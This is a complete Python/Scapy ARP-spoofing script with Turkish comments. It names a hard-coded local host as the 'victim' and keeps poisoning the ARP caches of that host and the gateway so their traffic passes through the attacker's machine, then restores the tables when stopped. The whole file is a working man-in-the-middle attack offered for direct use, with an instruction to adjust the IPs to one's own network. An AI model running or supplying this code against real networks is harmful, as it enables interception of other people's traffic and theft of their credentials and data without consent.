from scapy.all import *
import time
import sys

print("--- REAL ARP SPOOFER (MITM) ---")
# Hedef IP ve Modem IP'sini kendi ağina göre değiştir!
target_ip = "192.168.1.15" # Kurban
gateway_ip = "192.168.1.1" # Modem

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    if ans: return ans[0][1].hwsrc

def spoof(target, gateway):
    target_mac = get_mac(target)
    # Hedefe diyoruz ki: "Ben Modemim (Gateway)"
    packet = ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway)
    send(packet, verbose=0)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=0)

target_mac = get_mac(target_ip)
if not target_mac:
    print("Hedef bulunamadı.")
    sys.exit()

print(f"🔥 Saldırı Başladı: {target_ip} <-> {gateway_ip}")
print("Trafik artık senin üzerinden akıyor. (CTRL+C ile durdur)")

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nSaldırı durduruluyor, ARP tabloları düzeltiliyor...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)